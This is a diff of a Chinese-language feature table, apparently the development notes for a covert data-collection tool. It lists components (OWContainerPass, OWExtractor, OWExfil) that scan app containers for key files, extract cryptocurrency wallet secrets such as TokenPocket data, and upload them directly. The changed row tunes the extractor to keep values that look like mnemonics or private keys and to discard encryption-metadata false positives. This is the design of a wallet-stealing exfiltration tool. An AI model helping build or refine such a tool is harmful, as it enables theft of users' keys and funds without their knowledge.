@@ -552,7 +552,7 @@ B: TokenPocket 完成（0.1s）
 | 单目标 150MB / zip 150MB | `OWContainerPass._copyItem`、`OWRoute._uploadContainerResult` | 大目录不再到 398MB |
 | 目录过滤 + 宽兜底 | `OWContainerPass._collectAndIndex` | 定义目录先按 exts/keywords 过滤；漏掉时再按「无扩展名 / 小文件 / 非媒体」收，接住 F4SeCyr 这类密钥文件 |
 | B 单次定向查询 | `OWMCM.m` | `flags=0x900000000`，不做 flags 矩阵/枚举 |
-| 抽取去噪 | `OWExtractor.m` | 钱包标签 + 上下文过滤，hits 从 2000 降到 10 条量级 |
+| **抽取去噪** | `OWExtractor._match:` | 钱包标签 + 上下文过滤，hits 从 2000 降到 10 条量级；新增负上下文，排除 `encKey`/`ciphertext`/`mac`/`salt` 这类 64 位 hex 假阳性；`json_field` 要求值像密钥（含空格或 ≥32 字符） |
 | 注册表单直传 | `OWExfil.uploadJSONNow`、`OWAppDelegate.m` | 不进 pending 队列 |
 | 端点日志只打一次 | `OWExfil.init` | 避免刷屏 |
 | **Telegram/WhatsApp/微信不采集** | `OWContainerPass.OWSkipBundleIds` + `run` 循环 | 连 container_query 都不发，日志留「跳过（IM 类不采集）」；`targets.plist` 已删 TG/WA |
